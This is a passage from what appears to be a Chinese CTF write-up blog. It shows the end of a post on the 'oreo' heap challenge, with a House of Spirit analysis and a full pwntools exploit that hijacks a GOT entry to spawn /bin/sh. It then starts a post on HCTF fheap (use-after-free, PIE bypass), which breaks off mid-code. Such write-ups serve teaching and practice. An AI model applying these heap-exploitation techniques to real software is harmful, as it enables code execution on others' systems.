*((_DWORD *)dword_804A288 + <span class="number">13</span>) = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Rifle name: &quot;</span>);</span><br><span class="line">    fgets(dword_804A288 + <span class="number">25</span>, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(dword_804A288 + <span class="number">25</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Rifle description: &quot;</span>);</span><br><span class="line">    fgets(dword_804A288, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    sub_80485EC(dword_804A288);</span><br><span class="line">    ++dword_804A2A4;</span><br><span class="line">  }</span><br></pre></td></tr></table></figure></p>
<h5 id="2-Show-added-rifles"><a href="#2-Show-added-rifles" class="headerlink" title="2. Show added rifles"></a>2. Show added rifles</h5><p>&#x6253;&#x5370;&#x51FA;&#x67AA;&#x652F;&#x4FE1;&#x606F;&#xFF0C;&#x5982;&#x679C;&#x5728;&#x4E0A;&#x4E00;&#x6B65;&#x4E2D;&#xFF0C;&#x5C06;*last_chunk&#x8986;&#x76D6;&#x4E3A;put@got&#x5730;&#x5740;&#xFF0C;&#x90A3;&#x4E48;show&#x7684;&#x65F6;&#x5019;&#x5C31;&#x4F1A;&#x6253;&#x5370;&#x51FA;&#x7A0B;&#x5E8F;&#x52A0;&#x8F7D;libc&#x540E;put&#x7684;&#x5730;&#x5740;&#x3002;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Rifle to be ordered:\n%s\n&quot;</span>, <span class="string">&quot;===================================&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = dword_804A288; i; i = (<span class="keyword">char</span> *)*((_DWORD *)i + <span class="number">13</span>) )</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, i + <span class="number">25</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Description: %s\n&quot;</span>, i);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;===================================&quot;</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p>
<h4 id="3-Order-selected-rifles"><a href="#3-Order-selected-rifles" class="headerlink" title="3. Order selected rifles"></a>3. Order selected rifles</h4><p>&#x91CA;&#x653E;&#x6240;&#x6709;&#x901A;&#x8FC7;add rifle&#x7533;&#x8BF7;&#x7684;chunk&#xFF0C;&#x4ECE;0x804A288&#x5F00;&#x59CB;&#x901A;&#x8FC7;*last_chunk&#x6307;&#x9488;&#xFF0C;&#x91CA;&#x653E;&#x4F9D;&#x6B21;&#x94FE;&#x63A5;&#x7684;chunk<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v2 = dword_804A288;</span><br><span class="line"><span class="keyword">if</span> ( dword_804A2A4 )</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">while</span> ( v2 )</span><br><span class="line">  {</span><br><span class="line">    ptr = v2;</span><br><span class="line">    v2 = (<span class="keyword">char</span> *)*((_DWORD *)v2 + <span class="number">13</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  }</span><br><span class="line">  dword_804A288 = <span class="number">0</span>;</span><br><span class="line">  ++dword_804A2A0;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Okay order submitted!&quot;</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p>
<h4 id="4-Leave-a-Message-with-your-Order"><a href="#4-Leave-a-Message-with-your-Order" class="headerlink" title="4. Leave a Message with your Order"></a>4. Leave a Message with your Order</h4><p>&#x5411;0x804A2A8&#x6307;&#x5411;&#x7684;&#x5730;&#x5740;&#x5438;&#x5165;&#x6570;&#x636E;<br><code>fgets(dword_804A2A8, 128, stdin);</code></p>
<h3 id="&#x5229;&#x7528;&#x5206;&#x6790;"><a href="#&#x5229;&#x7528;&#x5206;&#x6790;" class="headerlink" title="&#x5229;&#x7528;&#x5206;&#x6790;"></a>&#x5229;&#x7528;&#x5206;&#x6790;</h3><ol>
<li>&#x7531;&#x7A0B;&#x5E8F;&#x529F;&#x80FD;Add new rifle&#x4E2D;&#x7684;fgets&#x51FD;&#x6570;&#x7684;&#x6EA2;&#x51FA;&#x6F0F;&#x6D1E;&#xFF0C;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x53EF;&#x63A7;&#x7684;&#x6307;&#x9488;&#xFF0C;&#x7ED3;&#x5408;&#x7A0B;&#x5E8F;&#x7684;Show added rifles&#x529F;&#x80FD;&#xFF0C;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;libc&#x4E2D;&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x8FDB;&#x800C;&#x53EF;&#x4EE5;&#x8BA1;&#x7B97;&#x51FA;&#x5C5E;system&#x7684;&#x5730;&#x5740;&#x3002;</li>
<li>&#x56E0;&#x4E3A;free()&#x53C2;&#x6570;&#x53EF;&#x63A7;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5229;&#x7528;House of spirit&#x653B;&#x51FB;&#xFF0C;&#x5728;&#x76EE;&#x6807;&#x4F4D;&#x7F6E;&#x4F2A;&#x9020;&#x4E00;&#x4E2A;chunk&#xFF0C;&#x91CA;&#x653E;&#x540E;&#x518D;&#x7533;&#x8BF7;&#xFF0C;&#x7ED3;&#x5408;&#x7A0B;&#x5E8F;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5B9E;&#x73B0;&#x5728;&#x76EE;&#x6807;&#x4F4D;&#x7F6E;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x3002;</li>
<li>&#x7ED3;&#x5408;&#x5BF9;&#x7A0B;&#x5E8F;&#x7684;&#x5206;&#x6790;&#xFF0C;&#x7533;&#x8BF7;&#x4E00;&#x4E2A;chunk&#xFF0C;&#x5C06;*last_chunk&#x6307;&#x9488;&#x8986;&#x76D6;&#x4E3A;0x804A2A8&#xFF0C;&#x5373;&#x5F15;&#x5BFC;&#x7A0B;&#x5E8F;&#x91CA;&#x653E;fake chunk&#xFF0C;&#x7ED3;&#x5408;&#x4E0A;&#x9762;&#x5BF9;fast chunk&#x91CA;&#x653E;&#x7684;&#x68C0;&#x6D4B;&#xFF0C;&#x6784;&#x9020;fakechunk&#x5982;&#x4E0B;<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">+------------+</span><br><span class="line">|<span class="string"> 0xdeadbeef </span>|<span class="string">  # prev_size&#x4F4D;&#xFF0C;&#x8BE5;chunk&#x5728;&#x4F7F;&#x7528;&#x65F6;&#xFF0C;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x4E0D;&#x7528;&#x7BA1;</span></span><br><span class="line"><span class="string">+------------+</span></span><br><span class="line">|<span class="string">    0x41    </span>|<span class="string">  # &#x4F2A;&#x9020;&#x7684;chunk size&#x8981;&#x5BF9;&#x9F50;0x41&#x6216;&#x8005;0x40&#x90FD;&#x53EF;&#x4EE5;</span></span><br><span class="line"><span class="string">+------------+&lt;-fake_addr(ptr)</span></span><br><span class="line">|<span class="string"> 0x0804a2c0 </span>|<span class="string">  # 0x804A2A8</span></span><br><span class="line"><span class="string">+------------+</span></span><br><span class="line">|<span class="string">    0x0     </span>|</span><br><span class="line">+------------+</span><br><span class="line">|<span class="string">     ...    </span>|</span><br><span class="line">+------------+</span><br><span class="line">|<span class="string">    0x61    </span>|<span class="string">  # 0x0804a2c0 &apos;a&apos;*0x20</span></span><br><span class="line"><span class="string">+------------+</span></span><br><span class="line">|<span class="string">    0x61    </span>|</span><br><span class="line">+------------+</span><br><span class="line">|<span class="string">     ...    </span>|</span><br><span class="line">+------------+</span><br><span class="line">|<span class="string">    0x00    </span>|<span class="string">  # 0x0804a2dc</span></span><br><span class="line"><span class="string">+------------+</span></span><br><span class="line">|<span class="string"> 0xdeadbeef </span>|<span class="string">  # prev_size&#x4F4D;,&#x5F53;&#x8BE5;chunk free&#x65F6;&#xFF0C;&#x4E3A;&#x4E0A;&#x4E00;&#x4E2A;free chunk&#x5927;&#x5C0F;</span></span><br><span class="line"><span class="string">+------------+</span></span><br><span class="line">|<span class="string">    0x40    </span>|<span class="string">  # next chunk&#x7684;SIZE</span></span><br><span class="line"><span class="string">+------------+</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>&#x4E0B;&#x9762;&#x662F;&#x91CA;&#x653E;&#x8FC7;&#x7A0B;&#xFF1A;<br>&#x56E0;&#x4E3A;0x804A288&#x5B58;&#x50A8;&#x7684;&#x4E00;&#x76F4;&#x662F;&#x6700;&#x65B0;&#x7533;&#x8BF7;&#x7684;chunk&#x8FD4;&#x56DE;&#x7684;&#x6307;&#x9488;&#xFF0C;&#x6240;&#x7A0B;&#x5E8F;&#x9996;&#x5148;&#x91CA;&#x653E;&#x8BE5;&#x5730;&#x5740;&#x6307;&#x5411;&#x7684;chunk&#xFF0C;&#x8FD9;&#x4E2A;chunk&#x662F;&#x6B63;&#x5E38;&#x7533;&#x8BF7;&#x7684;&#xFF0C;&#x6240;&#x4EE5;SIZE&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x68C0;&#x6D4B;&#xFF0C;&#x5176;&#x4E2D;&#x4F1A;&#x68C0;&#x6D4B;&#x4E0B;&#x4E00;&#x4E2A;chunk&#x7684;SIZE&#xFF0C;&#x56E0;&#x4E3A;&#x4E0B;&#x4E00;&#x4E2A;chunk&#x7684;top chunk&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x68C0;&#x6D4B;&#x3002;</p>
<p>&#x63A5;&#x7740;&#x91CA;&#x653E;*last_chunk&#x6307;&#x5411;&#x7684;fakechunk 0x804A2A8&#xFF0C;fake chunk&#x7684;SIZE&#x901A;&#x8FC7;&#x7533;&#x8BF7;0x3f&#x6B21;&#x7684;chunk&#xFF0C;&#x6765;&#x4F7F;&#x5176;&#x5185;&#x5BB9;&#x6700;&#x540E;&#x4E3A;0x41&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x8FC7;SIZE&#x68C0;&#x6D4B;&#xFF0C;&#x4E4B;&#x540E;&#x68C0;&#x6D4B;next chunk&#x7684;SIZE&#xFF0C;&#x5176;&#x5927;&#x5C0F;&#x53EF;&#x4EE5;&#x4E3A;8&#x5230;128kb&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x610F;&#x7684;&#x503C;&#x3002;</p>
<p>&#x91CA;&#x653E;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x518D;&#x6B21;&#x7533;&#x8BF7;&#xFF0C;&#x5E76;&#x5199;&#x5165;<strong>isoc99_sscanf_got&#xFF0C;</strong>isoc99_sscanf_got&#x7684;&#x5730;&#x5740;&#x5C31;&#x88AB;&#x5199;&#x5728;0x804A2A8&#x5904;&#xFF0C;&#x8C03;&#x7528;&#x7A0B;&#x5E8F;Leave a Message with your Order&#x529F;&#x80FD;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5C06;&#x4E4B;&#x524D;&#x83B7;&#x5F97;&#x7684;system&#x7684;&#x5730;&#x5740;&#x5199;&#x5165;0x804A2A8&#x6307;&#x5411;&#x7684;&#x5730;&#x5740;&#x5185;&#xFF0C;&#x5373;&#x8C03;&#x7528;<strong>isoc99_sscanf&#x5373;&#x8C03;&#x7528;system&#xFF0C;&#x7ED3;&#x675F;&#x529F;&#x80FD;&#x65F6;&#xFF0C;&#x7A0B;&#x5E8F;&#x4F1A;&#x63A5;&#x53D7;&#x6307;&#x4EE4;&#xFF0C;&#x8C03;&#x7528;&#x7684;&#x5C31;&#x662F;</strong>isoc99_sscanf&#xFF0C;&#x6B64;&#x65F6;&#x4F20;&#x5165;&#x2019;/bin/sh;&#x2019;&#x5373;&#x53EF;&#x83B7;&#x5F97;shell</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/use/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">p = process(<span class="string">&apos;./oreo&apos;</span>)</span><br><span class="line">elf = ELF(<span class="string">&apos;./oreo&apos;</span>)</span><br><span class="line">libc = ELF(<span class="string">&apos;./libc&apos;</span>)</span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">	context.log_level = <span class="string">&apos;debug&apos;</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(description,name)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line">	p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;===================================\n&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span><span class="params">(msg)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">&apos;4&apos;</span>)</span><br><span class="line">	p.sendline(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">&apos;step 1. use heap overflow to leak the addr of system and /bin/sh&apos;</span></span><br><span class="line">	puts_got = elf.got[<span class="string">&apos;puts&apos;</span>]</span><br><span class="line">	name = <span class="string">&apos;n&apos;</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">	add(<span class="string">&apos;d&apos;</span>*<span class="number">25</span>,name)</span><br><span class="line">	show()</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Description: &apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Description: &apos;</span>)</span><br><span class="line">	puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">	log.success(<span class="string">&apos;puts_addr: &apos;</span>+hex(puts_addr))</span><br><span class="line">	libc_base = puts_addr - libc.symbols[<span class="string">&apos;puts&apos;</span>]</span><br><span class="line">	system_addr = libc_base + libc.symbols[<span class="string">&apos;system&apos;</span>]</span><br><span class="line">	log.success(<span class="string">&apos;system_addr: &apos;</span>+hex(system_addr))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span> <span class="string">&apos;create a fack chunk at 0x804a2a8&apos;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x3f</span>):  <span class="comment">#make the content of 0x804a2a8 is 39</span></span><br><span class="line">		add(<span class="string">&apos;d&apos;</span>*<span class="number">25</span>,<span class="string">&apos;n&apos;</span>*<span class="number">27</span>)</span><br><span class="line">	name = <span class="string">&apos;n&apos;</span>*<span class="number">27</span> + p32(<span class="number">0x804a2a8</span>)</span><br><span class="line">	add(<span class="string">&apos;d&apos;</span>*<span class="number">25</span>,name)</span><br><span class="line">	<span class="comment">#payload = &apos;\x00&apos;*0x20 + p32(0x40)+p32(0x40)</span></span><br><span class="line">	payload = <span class="string">&apos;a&apos;</span>*(<span class="number">0x20</span><span class="number">-0x4</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x40</span>)</span><br><span class="line">	message(payload)</span><br><span class="line">	order()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">print</span> <span class="string">&apos;step 3. get shell&apos;</span></span><br><span class="line">	__isoc99_sscanf_got = p32(elf.got[<span class="string">&apos;__isoc99_sscanf&apos;</span>])</span><br><span class="line">	add(__isoc99_sscanf_got,<span class="string">&apos;deadbeef&apos;</span>)</span><br><span class="line">	log.success(<span class="string">&apos;__isoc99_sscanf:&apos;</span>+hex(elf.got[<span class="string">&apos;__isoc99_sscanf&apos;</span>]))</span><br><span class="line">	message(p32(system_addr))</span><br><span class="line">	p.sendline(<span class="string">&apos;/bin/sh;&apos;</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__mian__&apos;</span>:</span><br><span class="line">  pwn()</span><br></pre></td></tr></table></figure>
<h2 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h2><p>House of spirit&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x4F2A;&#x9020;&#x4E00;&#x4E2A;fake fastchunk&#xFF0C;&#x7ED5;&#x8FC7;glibc&#x7684;&#x68C0;&#x6D4B;&#xFF0C;&#x8BA9;&#x7A0B;&#x5E8F;&#x6210;&#x529F;free&#x6389;&#x8BE5;fake chunk&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;fastbin&#x7684;&#x5206;&#x914D;&#x673A;&#x5236;&#xFF0C;&#x518D;&#x6B21;&#x7533;&#x8BF7;&#x5230;&#x8BE5;fake chunk&#xFF0C;&#x4ECE;&#x800C;&#x8FBE;&#x5230;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x5199;&#x7684;&#x6548;&#x679C;&#xFF0C;oreo&#x53EA;&#x662F;&#x4E00;&#x79CD;&#x5229;&#x7528;&#x65B9;&#x5F0F;&#xFF0C;&#x6BD4;&#x5982;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;House of spirit&#x5C06;chunk&#x91CA;&#x653E;&#x5230;&#x6808;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x4FEE;&#x6539;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#xFF0C;&#x52AB;&#x6301;&#x7A0B;&#x5E8F;&#x6D41;&#x3002;</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/03/02/2016-HCTF-fheap-[fastbin UAF,PIE,DynELF use fmt]/">2016-HCTF-fheap-[fastbin UAF,PIE,DynELF use fmt]</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-03-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/UAF/">UAF</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/DynELF/">DynELF</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/PIE/">PIE</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/format-string/">format string</a></span><div class="content"><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Canary</span>                        <span class="string">:</span> <span class="literal">Yes</span></span><br><span class="line"><span class="string">NX</span>                            <span class="string">:</span> <span class="literal">Yes</span></span><br><span class="line"><span class="string">PIE</span>                           <span class="string">:</span> <span class="literal">Yes</span></span><br><span class="line"><span class="string">Fortify</span>                       <span class="string">:</span> <span class="literal">No</span></span><br><span class="line"><span class="string">RelRO</span>                         <span class="string">:</span> <span class="string">Partial</span></span><br></pre></td></tr></table></figure>
<p>&#x7A0B;&#x5E8F;&#x6709;&#x4E24;&#x4E2A;&#x529F;&#x80FD;&#xFF1A;1&#x3001;create string 2&#x3001;delete string<br>&#x5728;create string&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x5F53;&#x7533;&#x8BF7;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x5C0F;&#x4E8E;16&#x5B57;&#x8282;&#x65F6;&#xFF0C;&#x4F1A;&#x76F4;&#x63A5;&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x5B58;&#x653E;&#x5728;&#x5806;&#x4E2D;&#xFF1B;&#x5982;&#x679C;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;16&#x5B57;&#x8282;&#xFF0C;&#x5C31;&#x4F1A;&#x53E6;&#x7533;&#x8BF7;&#x4E00;&#x5757;&#x5806;&#x5185;&#x5B58;&#xFF0C;&#x5E76;&#x5C06;&#x6307;&#x9488;&#x5B58;&#x653E;&#x5728;&#x539F;&#x5806;&#x5757;&#x4E2D;&#x3002;&#x7A0B;&#x5E8F;&#x7ED3;&#x6784;&#x4F53;&#x5982;&#x4E0B;&#x6240;&#x793A;</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef <span class="class"><span class="keyword">struct</span> <span class="title">String</span>{</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> {</span></span><br><span class="line">        char *buf;</span><br><span class="line">        char array[<span class="number">16</span>];</span><br><span class="line">    } o;</span><br><span class="line">    int len;</span><br><span class="line">    void (*free)(<span class="class"><span class="keyword">struct</span> <span class="title">String</span> *<span class="title">ptr</span>);</span></span><br><span class="line">} String;</span><br></pre></td></tr></table></figure>
<p>&#x7A0B;&#x5E8F;&#x5728;delete string&#x65F6;free&#x5806;&#x5757;&#xFF0C;&#x6CA1;&#x6709;&#x5C06;&#x5806;&#x6307;&#x9488;&#x8BBE;&#x4E3A;NULL&#xFF0C;&#x5BFC;&#x81F4;&#x5B58;&#x5728;UAF&#x6F0F;&#x6D1E;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;UAF&#x6F0F;&#x6D1E;&#x8986;&#x76D6;<code>void (*free)(struct String *ptr);</code>&#x51FD;&#x6570;&#x6307;&#x9488;&#x4E3A;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x6267;&#x884C;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x4E3A;&#x51FD;&#x6570;&#x5F00;&#x542F;&#x4E86;PIE&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x7ED5;&#x8FC7;PIE&#x3002;</p>
<h2 id="&#x5229;&#x7528;UAF&#x548C;partial-overwrite&#x7ED5;&#x8FC7;PIE"><a href="#&#x5229;&#x7528;UAF&#x548C;partial-overwrite&#x7ED5;&#x8FC7;PIE" class="headerlink" title="&#x5229;&#x7528;UAF&#x548C;partial overwrite&#x7ED5;&#x8FC7;PIE"></a>&#x5229;&#x7528;UAF&#x548C;partial overwrite&#x7ED5;&#x8FC7;PIE</h2><p>&#x7531;&#x4E8E;&#x5185;&#x5B58;&#x9875;&#x7684;&#x8F7D;&#x5165;&#x673A;&#x5236;&#xFF0C;PIE&#x7684;&#x968F;&#x673A;&#x5316;&#x53EA;&#x80FD;&#x5BF9;&#x5355;&#x4E2A;&#x5185;&#x5B58;&#x9875;&#x8FDB;&#x884C;&#x968F;&#x673A;&#x5316;&#xFF0C;&#x56E0;&#x4E3A;&#x4E00;&#x4E2A;&#x5185;&#x5B58;&#x9875;&#x7684;&#x5927;&#x5C0F;&#x901A;&#x5E38;&#x4E3A;0x1000&#xFF0C;&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x88AB;&#x968F;&#x673A;&#x5316;&#x7684;&#x5730;&#x5740;&#x6765;&#x8BF4;&#xFF0C;&#x65E0;&#x8BBA;&#x5730;&#x5740;&#x600E;&#x4E48;&#x53D8;&#xFF0C;&#x5B83;&#x7684;&#x4F4E;12bit&#xFF0C;3&#x4E2A;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x6570;&#x4E0D;&#x4F1A;&#x53D8;&#x3002;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;partial overwrite&#xFF0C;&#x4FEE;&#x6539;<code>void (*free)(struct String *ptr);</code>&#x51FD;&#x6570;&#x6307;&#x9488;&#x3002;<br>&#x56E0;&#x4E3A;&#x8986;&#x76D6;&#x65F6;&#x53EA;&#x80FD;&#x8986;&#x76D6;&#x6574;&#x4E2A;&#x5B57;&#x8282;&#xFF08;8bit&#x6216;16bit&#xFF0C;&#x5373;2&#x4E2A;&#x6216;4&#x4E2A;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x6570;&#xFF09;&#xFF0C;&#x539F;&#x51FD;&#x6570;&#x6307;&#x9488;&#x540E;&#x4E09;&#x4F4D;&#x4E3A;0xD52&#xFF0C;&#x7ECF;&#x89C2;&#x5BDF;puts&#x51FD;&#x6570;<code>.text:0000000000000D2D                 call    _puts</code>&#x540E;&#x4E09;&#x4F4D;&#x4E3A;0xD2D&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x9700;&#x8981;&#x5C06;0x52&#x8986;&#x76D6;&#x4E3A;0x2D&#x5C31;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;puts&#x6253;&#x5370;&#x51FA;puts&#x7684;&#x5730;&#x5740;&#xFF0C;&#x7136;&#x540E;&#x51CF;&#x53BB;0xD2D&#x83B7;&#x53D6;&#x7A0B;&#x5E8F;&#x57FA;&#x5740;</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span>(<span class="number">4</span>,<span class="string">&apos;bb&apos;</span>)</span><br><span class="line"><span class="keyword">create</span>(<span class="number">4</span>,<span class="string">&apos;cc&apos;</span>)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">data</span>=<span class="string">&apos;a&apos;</span> * <span class="number">0x10</span> + <span class="string">&apos;b&apos;</span> * <span class="number">0x8</span> + <span class="string">&apos;\x2d&apos;</span></span><br><span class="line"><span class="keyword">create</span>(<span class="number">0x20</span>, <span class="keyword">data</span>)  #<span class="keyword">data</span>&#x88AB;&#x5199;&#x8FDB;chunk1&#x4E2D;</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&apos;b&apos;</span> * <span class="number">0x8</span>)</span><br><span class="line"><span class="keyword">data</span> = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span 